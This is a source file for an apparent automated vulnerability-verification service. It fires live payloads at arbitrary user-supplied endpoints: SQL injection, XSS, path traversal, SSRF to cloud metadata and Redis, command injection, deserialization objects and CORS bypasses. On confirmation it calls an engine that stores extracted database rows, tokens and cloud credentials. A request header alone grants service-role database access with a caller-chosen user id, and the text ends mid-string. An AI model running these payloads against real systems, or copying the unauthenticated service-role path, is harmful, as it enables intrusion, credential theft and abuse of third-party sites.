import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};

serve(async (req) => {
  if (req.method === "OPTIONS") return new Response(null, { headers: corsHeaders });

  try {
    const isWorker = req.headers.get("x-internal-worker") === "1";
    const authClient = createClient(
      Deno.env.get("SUPABASE_URL") ?? "",
      isWorker ? (Deno.env.get("SUPABASE_SERVICE_ROLE_KEY") ?? "") : (Deno.env.get("SUPABASE_ANON_KEY") ?? ""),
      isWorker ? {} : { global: { headers: { Authorization: req.headers.get("Authorization")! } } }
    );

    const LOVABLE_API_KEY = Deno.env.get("LOVABLE_API_KEY");
    const body = await req.json();
    const { action, finding, script, verificationResult, userId: bodyUserId } = body;

    let user: any = null;
    if (isWorker) {
      user = { id: bodyUserId ?? null };
    } else {
      const { data: { user: authedUser }, error: authError } = await authClient.auth.getUser();
      if (authError || !authedUser) {
        return new Response(JSON.stringify({ error: "Unauthorized" }), {
          status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" }
        });
      }
      user = authedUser;
    }

    if (action === "generate_script") {
      const generatedScript = await generateVerificationScript(finding, LOVABLE_API_KEY);
      return new Response(JSON.stringify({ script: generatedScript }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" }
      });
    }

    if (action === "run_verification") {
      const result = await runVerification(finding, script, user.id, authClient);

      // ── If confirmed, run the exploitation/extraction engine and persist sensitive
      //    proof to the admin-only finding_exploit_proofs table.
      if (result.confirmed) {
        try {
          const proof = await exploitAndExtract(finding);
          const adminClient = createClient(
            Deno.env.get("SUPABASE_URL") ?? "",
            Deno.env.get("SUPABASE_SERVICE_ROLE_KEY") ?? ""
          );
          const { data: ins } = await adminClient.from("finding_exploit_proofs").insert({
            finding_id: finding.id ?? null,
            scan_id: finding.scan_id ?? finding.scanId ?? null,
            target_host: (() => { try { return new URL(finding.endpoint).hostname; } catch { return null; } })(),
            vuln_class: proof.vulnClass,
            exploit_technique: proof.technique,
            request_dump: proof.requestDump,
            response_dump: proof.responseDump,
            extracted_data: proof.extractedData,
            sensitivity_level: proof.sensitivity,
            confirmed: proof.exploited,
            reproduction_steps: proof.reproductionSteps,
            created_by: user.id,
          }).select("id").maybeSingle();

          // Surface only a non-sensitive summary to the requester.
          (result as any).exploitProof = {
            stored: !!ins?.id,
            proofId: ins?.id ?? null,
            vulnClass: proof.vulnClass,
            technique: proof.technique,
            exploited: proof.exploited,
            sensitivity: proof.sensitivity,
            extractedSummary: proof.summary,
            adminOnly: true,
            note: "Full sensitive proof (DB rows, file contents, tokens, IMDS credentials, etc.) is encrypted at rest and only visible to admins.",
          };
        } catch (e) {
          console.error("[exploit-extract] failed:", e);
        }
      }

      return new Response(JSON.stringify(result), {
        headers: { ...corsHeaders, "Content-Type": "application/json" }
      });
    }

    if (action === "generate_poc") {
      const report = await generatePOCReport(finding, verificationResult, LOVABLE_API_KEY);
      return new Response(JSON.stringify({ report }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" }
      });
    }

    return new Response(JSON.stringify({ error: "Invalid action" }), {
      status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" }
    });
  } catch (e) {
    console.error("verify-finding error:", e);
    return new Response(JSON.stringify({ error: e.message || "Internal error" }), {
      status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" }
    });
  }
});

async function generateVerificationScript(finding: any, apiKey: string | undefined): Promise<string> {
  if (!apiKey) return generateLocalScript(finding);

  try {
    const resp = await fetch("https://ai.gateway.lovable.dev/v1/chat/completions", {
      method: "POST",
      headers: { Authorization: `Bearer ${apiKey}`, "Content-Type": "application/json" },
      body: JSON.stringify({
        model: "google/gemini-2.5-flash",
        messages: [
          {
            role: "system",
            content: `You are an expert penetration tester generating verification scripts. Output ONLY the script content — no markdown fences, no explanations. The script should be a series of curl commands with comments explaining each test. Include:
1. The exact reproduction steps using curl
2. Multiple test variations to confirm the finding
3. Expected vs actual response comparison logic
4. Clear comments marking what confirms the vulnerability
Be specific to the vulnerability type and endpoint.`
          },
          {
            role: "user",
            content: `Generate a verification test script for this finding:
Title: ${finding.title}
Endpoint: ${finding.endpoint}
Method: ${finding.method || "GET"}
Payload: ${finding.payload || "N/A"}
Evidence: ${finding.evidence || "N/A"}
CWE: ${finding.cwe || "N/A"}
Category: ${finding.category || "N/A"}
Severity: ${finding.severity}`
          }
        ],
        max_tokens: 2000,
      }),
    });

    if (!resp.ok) return generateLocalScript(finding);

    const data = await resp.json();
    return data.choices?.[0]?.message?.content || generateLocalScript(finding);
  } catch {
    return generateLocalScript(finding);
  }
}

function generateLocalScript(finding: any): string {
  const url = finding.endpoint || "";
  const method = finding.method || "GET";
  const payload = finding.payload || "";
  const cwe = finding.cwe || "";

  if (cwe.includes("89") || finding.category === "sqli") {
    return `# SQL Injection Verification
# Target: ${url}

# Test 1: Error-based detection
curl -v "${url}${url.includes("?") ? "&" : "?"}id=1'"

# Test 2: Boolean-based blind
curl -s -o /dev/null -w "%{http_code}" "${url}${url.includes("?") ? "&" : "?"}id=1 AND 1=1"
curl -s -o /dev/null -w "%{http_code}" "${url}${url.includes("?") ? "&" : "?"}id=1 AND 1=2"

# Test 3: Original payload
curl -v "${url}${url.includes("?") ? "&" : "?"}${payload}"

# Confirm: Different responses = SQLi confirmed`;
  }

  if (cwe.includes("79") || finding.category === "xss") {
    return `# XSS Verification
# Target: ${url}

# Test 1: Reflected XSS check
curl -v "${url}${url.includes("?") ? "&" : "?"}q=${encodeURIComponent(payload || "<script>alert(1)</script>")}"

# Test 2: Event handler bypass
curl -v "${url}${url.includes("?") ? "&" : "?"}q=${encodeURIComponent("<img src=x onerror=alert(1)>")}"

# Confirm: Unescaped payload in response body = XSS confirmed`;
  }

  return `# Vulnerability Verification
# Finding: ${finding.title}
# Target: ${url}

curl -v -X ${method} "${url}" ${payload ? `-d "${payload}"` : ""}

# Review response for: ${finding.evidence || "vulnerability indicators"}`;
}

// ── SSRF guard: block scans against internal targets even from server-side verifier
function isPrivateHost(host: string): boolean {
  const h = host.toLowerCase();
  if (h === "localhost" || h.endsWith(".local") || h.endsWith(".internal")) return true;
  if (/^(127\.|10\.|192\.168\.|169\.254\.|0\.0\.0\.0)/.test(h)) return true;
  if (/^172\.(1[6-9]|2\d|3[01])\./.test(h)) return true;
  if (/^(::1|fc00:|fd00:|fe80:)/i.test(h)) return true;
  return false;
}

interface Probe {
  step: number;
  label: string;
  request: string;
  status: number;
  responseTime: number;
  bodySnippet: string;
  headers: Record<string, string>;
  bodyLen: number;
  bodyHash: string;
}

// ── Retry/backoff state shared per verification run
interface RetryStats {
  total: number;
  retried: number;
  failures5xx: number;
  timeouts: number;
  giveUps: number;
  lastErrors: string[];
}

async function httpProbe(
  url: string,
  method: string,
  label: string,
  step: number,
  body?: string,
  extraHeaders?: Record<string,string>,
  retryStats?: RetryStats,
): Promise<Probe | null> {
  if (retryStats) retryStats.total++;
  const MAX_ATTEMPTS = 3;
  const BASE_DELAY = 700; // ms — exponential backoff base
  let lastErr = "";

  try {
    const u = new URL(url);
    if (isPrivateHost(u.hostname)) {
      return { step, label: `${label} [BLOCKED private host]`, request: `${method} ${url}`, status: 0, responseTime: 0, bodySnippet: "blocked", headers: {}, bodyLen: 0, bodyHash: "0" };
    }
  } catch {
    return { step, label: `${label} [INVALID URL]`, request: `${method} ${url}`, status: 0, responseTime: 0, bodySnippet: "invalid url", headers: {}, bodyLen: 0, bodyHash: "0" };
  }

  for (let attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
    try {
      const start = Date.now();
      const ctrl = new AbortController();
      const t = setTimeout(() => ctrl.abort(), 12000);
      const resp = await fetch(url, {
        method,
        headers: { "User-Agent": "OmniSec-Verifier/2.0 (+exploit-engine)", "Accept": "*/*", ...(extraHeaders || {}) },
        body: body && method !== "GET" && method !== "HEAD" ? body : undefined,
        redirect: "manual",
        signal: ctrl.signal,
      });
      clearTimeout(t);
      const rt = Date.now() - start;
      const text = await resp.text().catch(() => "");
      const hdrs = Object.fromEntries(resp.headers.entries());

      // Retry on 5xx
      if (resp.status >= 500 && resp.status < 600 && attempt < MAX_ATTEMPTS) {
        if (retryStats) { retryStats.retried++; retryStats.failures5xx++; retryStats.lastErrors.push(`${label}: HTTP ${resp.status} (attempt ${attempt})`); }
        await new Promise(r => setTimeout(r, BASE_DELAY * Math.pow(2, attempt - 1)));
        continue;
      }
      if (resp.status >= 500 && retryStats) { retryStats.failures5xx++; retryStats.giveUps++; }

      let h = 0; for (let i = 0; i < text.length; i++) { h = ((h << 5) - h) + text.charCodeAt(i); h = h & h; }
      return {
        step, label: attempt > 1 ? `${label} [retry x${attempt-1}]` : label,
        request: `${method} ${url}\nUser-Agent: OmniSec-Verifier/2.0`,
        status: resp.status, responseTime: rt,
        bodySnippet: text.slice(0, 1500),
        headers: hdrs,
        bodyLen: text.length,
        bodyHash: Math.abs(h).toString(36),
      };
    } catch (e: any) {
      lastErr = e.message || String(e);
      const isTimeout = /abort|timeout/i.test(lastErr);
      if (retryStats) {
        if (isTimeout) retryStats.timeouts++;
        retryStats.lastErrors.push(`${label}: ${lastErr} (attempt ${attempt})`);
      }
      if (attempt < MAX_ATTEMPTS) {
        if (retryStats) retryStats.retried++;
        await new Promise(r => setTimeout(r, BASE_DELAY * Math.pow(2, attempt - 1)));
        continue;
      }
      if (retryStats) retryStats.giveUps++;
      return { step, label: `${label} [ERROR after ${MAX_ATTEMPTS} attempts: ${lastErr}]`, request: `${method} ${url}`, status: 0, responseTime: 0, bodySnippet: lastErr, headers: {}, bodyLen: 0, bodyHash: "0" };
    }
  }
  return null;
}

function injectParam(url: string, value: string, paramName?: string): string {
  try {
    const u = new URL(url);
    if (paramName) u.searchParams.set(paramName, value);
    else if ([...u.searchParams.keys()].length > 0) {
      const k = [...u.searchParams.keys()][0];
      u.searchParams.set(k, value);
    } else {
      u.searchParams.set("id", value);
    }
    return u.toString();
  } catch {
    const sep = url.includes("?") ? "&" : "?";
    return `${url}${sep}${paramName || "id"}=${encodeURIComponent(value)}`;
  }
}

async function runVerification(finding: any, _script: string, userId?: string, authClient?: any): Promise<any> {
  const endpoint = finding.endpoint || "";
  const method = (finding.method || "GET").toUpperCase();
  const category = (finding.category || "").toLowerCase();
  const cwe = String(finding.cwe || "");
  const param = finding.vulnerable_parameter || finding.parameter;

  const probes: Probe[] = [];
  let confirmed = false;
  const reasons: string[] = [];
  const steps: string[] = [];
  const retryStats: RetryStats = { total: 0, retried: 0, failures5xx: 0, timeouts: 0, giveUps: 0, lastErrors: [] };

  // Probe 0: baseline
  const baseline = await httpProbe(endpoint, method, "Baseline (no payload)", 0, undefined, undefined, retryStats);
  if (baseline) probes.push(baseline);

  // ABORT if baseline target is dead — don't waste oracles & log to audit
  const targetDead = !baseline || baseline.status === 0 || (baseline.status >= 500 && retryStats.failures5xx >= 1);
  if (targetDead) {
    reasons.push(`Target is unreachable or returning persistent ${baseline?.status || "network"} errors after retries — verification aborted.`);
    await logAuditFailure(authClient, userId, finding, retryStats, "target_unreachable");
    return buildResult(false, probes, reasons, ["Aborted: target instability detected; retry once target is healthy."], retryStats);
  }

  // Strategy per category
  if (cwe.includes("89") || category === "sqli" || category === "sql") {
    const trueUrl = injectParam(endpoint, "1' OR '1'='1", param);
    const falseUrl = injectParam(endpoint, "1' AND '1'='2", param);
    const errUrl = injectParam(endpoint, "1'\"", param);
    const t = await httpProbe(trueUrl, method, "Boolean TRUE payload (1' OR '1'='1)", 1, undefined, undefined, retryStats);
    const f = await httpProbe(falseUrl, method, "Boolean FALSE payload (1' AND '1'='2)", 2, undefined, undefined, retryStats);
    const e = await httpProbe(errUrl, method, "Error trigger payload (1'\")", 3, undefined, undefined, retryStats);
    [t,f,e].forEach(p => p && probes.push(p));
    const sqlErrRx = /(sql syntax|mysql_fetch|ORA-\d+|PostgreSQL|SQLite|SQLSTATE|unclosed quotation|unterminated|odbc|System\.Data\.SqlClient|MySqlException)/i;
    if (e && sqlErrRx.test(e.bodySnippet)) { confirmed = true; reasons.push(`Database error string surfaced after injecting quote (${e.bodySnippet.match(sqlErrRx)?.[0]})`); }
    if (baseline && t && f && t.bodyLen !== f.bodyLen && Math.abs(t.bodyLen - baseline.bodyLen) < Math.abs(f.bodyLen - baseline.bodyLen) - 50) {
      confirmed = true;
      reasons.push(`Boolean oracle confirmed: TRUE-payload body matches baseline (${t.bodyLen}b ~ ${baseline.bodyLen}b) but FALSE-payload diverges (${f.bodyLen}b)`);
    }
    const sleepUrl = injectParam(endpoint, "1' AND SLEEP(4)-- -", param);
    const sl = await httpProbe(sleepUrl, method, "Time-based payload (SLEEP(4))", 4, undefined, undefined, retryStats);
    if (sl) { probes.push(sl); if (sl.responseTime > 3500 && (!baseline || baseline.responseTime < 2000)) { confirmed = true; reasons.push(`Time-based SQLi: SLEEP(4) caused ${sl.responseTime}ms response vs baseline ${baseline?.responseTime}ms`); } }
    steps.push("1. Baseline request.","2. TRUE payload — should match baseline.","3. FALSE payload — divergence proves injection.","4. Quote to trigger DB error.","5. SLEEP() — measurable delay confirms blind SQLi.");
  }

  else if (cwe.includes("79") || category === "xss") {
    const marker = `xss${Math.random().toString(36).slice(2,8)}`;
    const html = `"><svg/onload=confirm(1)>${marker}`;
    const probe = await httpProbe(injectParam(endpoint, html, param), method, "XSS payload reflection", 1, undefined, undefined, retryStats);
    if (probe) probes.push(probe);
    if (probe && probe.bodySnippet.includes(marker)) {
      const ctx = probe.bodySnippet.indexOf(html) >= 0 ? "raw HTML (unencoded)" : probe.bodySnippet.includes(`&lt;svg`) ? "HTML-encoded (NOT vulnerable)" : "partial encoding";
      if (ctx === "raw HTML (unencoded)") { confirmed = true; reasons.push(`Payload reflected unencoded — context: ${ctx}`); }
      else reasons.push(`Marker reflected but encoded — likely false positive (${ctx})`);
    }
    steps.push("1. Inject unique marker + XSS vector.","2. Search response body for raw payload vs encoded form.","3. Confirm execution context.");
  }

  else if (cwe.includes("22") || category === "traversal" || category === "lfi") {
    const payloads = ["../../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd", "....//....//etc/passwd", "..%252f..%252fetc%252fpasswd"];
    for (let i = 0; i < payloads.length; i++) {
      const p = await httpProbe(injectParam(endpoint, payloads[i], param), method, `Path-traversal payload #${i+1}`, i+1, undefined, undefined, retryStats);
      if (p) { probes.push(p); if (/root:[x*]:0:0:/i.test(p.bodySnippet) || /\[boot loader\]/i.test(p.bodySnippet)) { confirmed = true; reasons.push(`/etc/passwd content recovered with payload "${payloads[i]}"`); break; } }
    }
    steps.push("1. Canonical traversal sequences.","2. URL-encoded + double-encoded variants.","3. Match root:x:0:0: pattern.");
  }

  else if (cwe.includes("601") || category === "redirect") {
    const evil = "https://evil-canary.example.org/poc";
    const r = await httpProbe(injectParam(endpoint, evil, param || "url"), method, "Open-redirect probe", 1, undefined, undefined, retryStats);
    if (r) probes.push(r);
    const loc = r?.headers["location"] || "";
    if (r && r.status >= 300 && r.status < 400 && loc.includes("evil-canary.example.org")) { confirmed = true; reasons.push(`HTTP ${r.status} redirected to attacker URL via Location: ${loc}`); }
    steps.push("1. Submit attacker URL.","2. Confirm Location header echoes attacker domain with 3xx.");
  }

  else if (cwe.includes("346") || category === "cors") {
    // Multi-origin probe set — covers reflected origin, null origin, subdomain trust,
    // suffix-match bypasses (evil.victim.com), and pre-trusted-origin substring bypasses.
    const targetHost = (() => { try { return new URL(endpoint).hostname; } catch { return "victim.tld"; } })();
    const originVariants = [
      "https://evil-canary.example.org",
      "null",
      `https://${targetHost}.evil-canary.example.org`,        // suffix bypass
      `https://evil-canary-${targetHost}`,                    // prefix bypass
      `http://${targetHost}`,                                 // protocol downgrade
    ];
    let acaoReflected = false; let credentialed = false; let bypassOrigin = "";
    for (let i = 0; i < originVariants.length; i++) {
      const origin = originVariants[i];
      const r = await httpProbe(endpoint, "GET", `CORS probe — Origin: ${origin}`, i+1, undefined, { "Origin": origin }, retryStats);
      if (!r) continue;
      probes.push(r);
      const acao = (r.headers["access-control-allow-origin"] || "").trim();
      const acac = (r.headers["access-control-allow-credentials"] || "").trim().toLowerCase();
      const reflects = acao === origin || acao === "*" || (origin === "null" && acao === "null");
      if (reflects) {
        acaoReflected = true; bypassOrigin = origin;
        if (acac === "true") credentialed = true;
        reasons.push(`ACAO reflects "${origin}" → "${acao}"${acac === "true" ? " + ACAC=true" : ""}`);
      }
    }
    // Sensitivity oracle: a CORS misconfig is only triagable if the body returns
    // user-bound / sensitive data. Probe a baseline request and look for markers.
    if (acaoReflected) {
      const baseline = await httpProbe(endpoint, "GET", "CORS sensitivity oracle", 99, undefined, { "Origin": bypassOrigin }, retryStats);
      if (baseline) {
        probes.push(baseline);
        const body = baseline.bodySnippet || "";
        const ct = (baseline.headers["content-type"] || "").toLowerCase();
        const sensitivePatterns = [
          /"(email|e_?mail)"\s*:\s*"[^"]+@[^"]+"/i,
          /"(api[_-]?key|apikey|secret|access[_-]?token|refresh[_-]?token|session[_-]?id|csrf[_-]?token|jwt)"\s*:/i,
          /"(user(name|_id)?|account(_id)?|customer(_id)?|first[_-]?name|last[_-]?name|phone|address|ssn|dob|balance)"\s*:/i,
          /eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\./, // JWT
          /"role"\s*:\s*"(admin|owner|superuser|root)"/i,
        ];
        const matchedMarkers = sensitivePatterns.map(p => body.match(p)?.[0]).filter(Boolean) as string[];
        const looksJson = ct.includes("application/json") || body.trim().startsWith("{") || body.trim().startsWith("[");
        if (matchedMarkers.length > 0 || (looksJson && body.length > 50)) {
          confirmed = true;
          reasons.push(
            credentialed
              ? `EXPLOITABLE — credentialed cross-origin read of sensitive data possible from "${bypassOrigin}"`
              : `Permissive CORS confirmed; body returns ${looksJson ? "JSON payload" : "data"} ${matchedMarkers.length ? `with markers: ${matchedMarkers.slice(0,3).join(", ")}` : ""}`
          );
        } else {
          reasons.push(`CORS reflects "${bypassOrigin}" but response body has no obvious sensitive markers — manual review required (Bugcrowd will close as N/A without sensitive data).`);
        }
      }
    }
    steps.push(
      "1. Send GET with attacker Origin header (5 bypass variants: reflected, null, suffix, prefix, protocol-downgrade).",
      "2. Inspect ACAO/ACAC reflection — credentialed=true is critical.",
      "3. Sensitivity oracle: scan response body for email, tokens, JWTs, PII, account fields.",
      "4. If confirmed, the exploit engine generates an HTML PoC that fetches with credentials:include and displays victim data."
    );
  }

  else if (category === "ssrf" || cwe.includes("918")) {
    // Multi-probe SSRF: external canary, AWS IMDS v1+v2, GCP metadata, Azure IMDS, gopher/file scheme,
    // DNS-rebinding shaped hostname, decimal/hex IP encoding to bypass filters.
    const variants: Array<{ url: string; label: string; match: RegExp }> = [
      { url: "http://169.254.169.254/latest/meta-data/", label: "SSRF — AWS IMDSv1 metadata", match: /ami-id|instance-id|iam\/security-credentials|hostname/i },
      { url: "http://metadata.google.internal/computeMetadata/v1/", label: "SSRF — GCP metadata", match: /computeMetadata|project-id|service-accounts/i },
      { url: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", label: "SSRF — Azure IMDS", match: /compute|azEnvironment|subscriptionId/i },
      { url: "http://2852039166/latest/meta-data/", label: "SSRF — decimal-IP IMDS bypass", match: /ami-id|instance-id|iam\/security-credentials/i },
      { url: "http://0x0a9fea9e0/latest/meta-data/", label: "SSRF — hex-IP IMDS bypass", match: /ami-id|instance-id/i },
      { url: "file:///etc/passwd", label: "SSRF — file:// scheme", match: /root:[x*]:0:0:/i },
      { url: "gopher://127.0.0.1:6379/_INFO%0d%0a", label: "SSRF — gopher:// (Redis pivot)", match: /redis_version|role:master|os:linux/i },
    ];
    for (let i = 0; i < variants.length; i++) {
      const v = variants[i];
      const r = await httpProbe(injectParam(endpoint, v.url, param || "url"), method, v.label, i+1, undefined, undefined, retryStats);
      if (r) {
        probes.push(r);
        if (v.match.test(r.bodySnippet)) { confirmed = true; reasons.push(`${v.label}: payload reflected — ${r.bodySnippet.match(v.match)?.[0]}`); }
      }
    }
    steps.push("1. AWS/GCP/Azure metadata probes.","2. Decimal & hex IP encoding to bypass blocklists.","3. file:// and gopher:// scheme probes for non-HTTP pivots.");
  }

  else if (category === "cmdi" || cwe.includes("78")) {
    // Multi-probe: timing on *nix + Windows, output-echo via marker, DNS-style separators
    const marker = `cmd${Math.random().toString(36).slice(2,8)}`;
    const variants: Array<{ payload: string; label: string; timing?: boolean; echo?: string }> = [
      { payload: `;sleep 4;`,             label: "Cmd-injection — *nix sleep ;",        timing: true },
      { payload: `&& sleep 4`,            label: "Cmd-injection — *nix && sleep",       timing: true },
      { payload: `| sleep 4`,             label: "Cmd-injection — *nix pipe sleep",     timing: true },
      { payload: `\`sleep 4\``,           label: "Cmd-injection — backtick sleep",      timing: true },
      { payload: `$(sleep 4)`,            label: "Cmd-injection — $() sleep",           timing: true },
      { payload: `& timeout 4`,           label: "Cmd-injection — Windows timeout",     timing: true },
      { payload: `;echo ${marker};`,      label: "Cmd-injection — echo marker",         echo: marker },
    ];
    for (let i = 0; i < variants.length; i++) {
      const v = variants[i];
      const r = await httpProbe(injectParam(endpoint, v.payload, param), method, v.label, i+1, undefined, undefined, retryStats);
      if (!r) continue;
      probes.push(r);
      if (v.timing && r.responseTime > 3500 && (!baseline || baseline.responseTime < 2000)) {
        confirmed = true; reasons.push(`${v.label}: ${r.responseTime}ms vs baseline ${baseline?.responseTime}ms`);
      }
      if (v.echo && r.bodySnippet.includes(v.echo)) {
        confirmed = true; reasons.push(`${v.label}: marker "${v.echo}" surfaced in response body — output-confirmed RCE`);
      }
    }
    steps.push("1. Inject *nix and Windows timing payloads with multiple separators.","2. Inject echo marker for direct output confirmation.","3. Compare each elapsed time vs baseline.");
  }

  else if (category === "csrf" || cwe.includes("352")) {
    // CSRF oracle: state-changing endpoint that accepts cross-origin POST without token + permissive SameSite cookie
    const baselinePost = await httpProbe(endpoint, "POST", "CSRF — baseline POST no token", 1, "csrf_test=1", { "Content-Type": "application/x-www-form-urlencoded" }, retryStats);
    const crossOrigin = await httpProbe(endpoint, "POST", "CSRF — POST with attacker Origin", 2, "csrf_test=1", { "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://evil-canary.example.org", "Referer": "https://evil-canary.example.org/" }, retryStats);
    [baselinePost, crossOrigin].forEach(p => p && probes.push(p));

    // Look for token in response body (forms typically embed CSRF token); absence → suspect
    const setCookie = (baselinePost?.headers["set-cookie"] || crossOrigin?.headers["set-cookie"] || "").toLowerCase();
    const tokenPatterns = /(csrf|xsrf|authenticity_token|__requestverificationtoken)/i;
    const hasTokenInBody = baseline && tokenPatterns.test(baseline.bodySnippet);
    const sameSiteWeak = setCookie && !/samesite=(strict|lax)/i.test(setCookie);

    if (crossOrigin && crossOrigin.status >= 200 && crossOrigin.status < 400 && !hasTokenInBody) {
      confirmed = true;
      reasons.push(`Cross-origin POST accepted (HTTP ${crossOrigin.status}) without visible CSRF token; cookie SameSite=${sameSiteWeak ? "missing/none" : "set"}`);
    } else if (sameSiteWeak) {
      reasons.push(`Cookie missing SameSite=Lax/Strict — CSRF risk if endpoint is state-changing.`);
    }
    steps.push("1. Issue baseline POST without anti-CSRF token.","2. Replay POST with attacker Origin/Referer headers.","3. Inspect Set-Cookie SameSite attribute & response token presence.");
  }

  else if (category === "race" || cwe.includes("362")) {
    // Race-condition oracle: fire N concurrent identical requests and look for divergent responses (e.g., duplicated resource ids, multiple 200s where uniqueness expected)
    const N = 8;
    const start = Date.now();
    const settled = await Promise.allSettled(
      Array.from({ length: N }, (_, i) => httpProbe(endpoint, method, `Race burst probe #${i+1}`, i+1, finding.payload || undefined, undefined, retryStats))
    );
    const results = settled.flatMap(s => s.status === "fulfilled" && s.value ? [s.value] : []);
    results.forEach(p => probes.push(p));
    const elapsed = Date.now() - start;
    const successCount = results.filter(p => p.status >= 200 && p.status < 300).length;
    const uniqueHashes = new Set(results.map(p => p.bodyHash));
    if (successCount >= 2 && uniqueHashes.size > 1) {
      confirmed = true;
      reasons.push(`Race condition signal: ${successCount}/${N} concurrent requests succeeded with ${uniqueHashes.size} distinct response bodies in ${elapsed}ms — TOCTOU window likely`);
    } else if (successCount >= 2) {
      reasons.push(`${successCount}/${N} concurrent requests succeeded but bodies identical — manual semantic check recommended.`);
    }
    steps.push(`1. Fire ${N} concurrent identical requests.`,"2. Compare response bodies for divergence.","3. Check whether uniqueness invariants (e.g., one-time coupon use) are violated.");
  }

  else if (category === "deserialization" || cwe.includes("502")) {
    // Insecure deserialization oracle: send crafted blobs and look for class-name/exception leaks or timing.
    const variants: Array<{ payload: string; ctype: string; label: string; match: RegExp }> = [
      { payload: 'O:8:"stdClass":0:{}', ctype: "application/x-www-form-urlencoded", label: "PHP serialized object",
        match: /unserialize|__wakeup|__destruct|stdClass|PHP Notice/i },
      { payload: "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeA==",
        ctype: "application/octet-stream", label: "Java serialized HashMap (base64)",
        match: /java\.io\.|ObjectInputStream|ClassNotFoundException|InvalidClassException/i },
      { payload: "!!python/object/apply:os.system [\"id\"]", ctype: "application/x-yaml", label: "Python YAML object tag",
        match: /yaml\.constructor|python\/object|uid=|gid=/i },
      { payload: "(I123\nS'attack'\np0\n.", ctype: "application/octet-stream", label: "Python pickle stream",
        match: /pickle|cPickle|UnpicklingError/i },
      { payload: '{"@type":"java.net.URL","val":"http://evil-canary.example.org/"}', ctype: "application/json",
        label: "Jackson polymorphic @type", match: /jackson|@type|java\.net\.URL|PolymorphicDeserialization/i },
    ];
    for (let i = 0; i < variants.length; i++) {
      const v = variants[i];
      const r = await httpProbe(endpoint, "POST", v.label, i+1, v.payload, { "Content-Type": v.ctype }, retryStats);
      if (!r) continue;
      probes.push(r);
      if (v.match.test(r.bodySnippet)) { confirmed = true; reasons.push(`${v.label}: server leaked deserializer signature — ${r.bodySnippet.match(v.match)?.[0]}`); }
    }
    steps.push("1. Send PHP/Java/Python/Jackson serialized payloads.","2. Look for deserializer class names or stack traces in response.","3. Confirm with timing or out-of-band callback for blind cases.");
  }

  else {
    const payload = finding.payload || "";
    const url = payload ? injectParam(endpoint, payload, param) : endpoint;
    const r = await httpProbe(url, method, "Generic replay with original payload", 1, undefined, undefined, retryStats);
    if (r) probes.push(r);
    if (r && finding.evidence && r.bodySnippet.toLowerCase().includes(String(finding.evidence).slice(0,80).toLowerCase())) {
      confirmed = true; reasons.push("Original evidence pattern still present in response");
    }
    steps.push("1. Replay the original payload.","2. Compare response to recorded evidence.");
  }

  // Audit failures from retry policy
  if (retryStats.giveUps > 0 || retryStats.failures5xx >= 2 || retryStats.timeouts >= 2) {
    await logAuditFailure(authClient, userId, finding, retryStats, "instability_during_verification");
  }

  return buildResult(confirmed, probes, reasons, steps, retryStats);
}

function buildResult(confirmed: boolean, probes: Probe[], reasons: string[], steps: string[], retryStats: RetryStats) {
  const requestLog = probes.map(p => `[Step ${p.step}] ${p.label}\n${p.request}`).join("\n\n");
  const responseLog = probes.map(p => `[Step ${p.step}] ${p.label}\nHTTP ${p.status} • ${p.responseTime}ms • ${p.bodyLen}b • hash=${p.bodyHash}\n${Object.entries(p.headers).slice(0,8).map(([k,v])=>`${k}: ${v}`).join("\n")}\n\n${p.bodySnippet.slice(0,800)}`).join("\n\n──────────\n\n");
  const retryNote = retryStats.retried > 0 || retryStats.giveUps > 0
    ? ` [Retry policy: ${retryStats.total} probes, ${retryStats.retried} retried, ${retryStats.failures5xx} 5xx, ${retryStats.timeouts} timeouts, ${retryStats.giveUps} given up]`
    : "";
  const analysis = confirmed
    ? `✅ CONFIRMED (${reasons.length} signal${reasons.length>1?"s":""}): ${reasons.join(" | ")}${retryNote}`
    : reasons.length
      ? `⚠️ Inconclusive — partial signals: ${reasons.join(" | ")}.${retryNote} Manual review recommended.`
      : `❌ NOT CONFIRMED — ${probes.length} probes executed, none triggered the vulnerability oracle.${retryNote}`;
  return {
    confirmed,
    request: requestLog,
    response: responseLog,
    statusCode: probes[probes.length-1]?.status ?? 0,
    responseTime: probes.reduce((s,p)=>s+p.responseTime,0),
    analysis,
    probes: probes.length,
    reproductionSteps: steps,
    reasons,
    retryStats,
  };
}

async function logAuditFailure(authClient: any, userId: string | undefined, finding: any, retryStats: RetryStats, reason: string) {
  if (!authClient || !userId) return;
  try {
    await authClient.from("security_audit_log").insert({
      user_id: userId,
      action: "verify_finding_retry_exhausted",
      module: "verify-finding",
      target: finding?.endpoint || finding?.target_host || "unknown",
      result: `${reason} | total=${retryStats.total} retried=${retryStats.retried} 5xx=${retryStats.failures5xx} timeouts=${retryStats.timeouts} giveUps=${retryStats.giveUps} | ${retryStats.lastErrors.slice(-3).join(" || ")}`,
    });
  } catch (e) {
    console.error("audit log insert failed:", e);
  }
}

async function generatePOCReport(finding: any, verificationResult: any, apiKey: string | undefined): Promise<string> {
  if (!apiKey) return generateLocalPOC(finding, verificationResult);

  try {
    const resp = await fetch("https://ai.gateway.lovable.dev/v1/chat/completions", {
      method: "POST",
      headers: { Authorization: `Bearer ${apiKey}`, "Content-Type": "application/json" },
      body: JSON.stringify({
        model: "google/gemini-2.5-flash",
        messages: [
          {
            role: "system",
            content: `You are a professional bug bounty hunter writing a POC report. Write in Markdown format. Include:
1. Title and severity summary table
2. Detailed description of the vulnerability
3. Step-by-step reproduction with exact curl commands
4. Request/Response evidence
5. Impact analysis (what an attacker can achieve)
6. CVSS scoring justification
7. Remediation recommendations
8. References (CWE, OWASP, relevant resources)
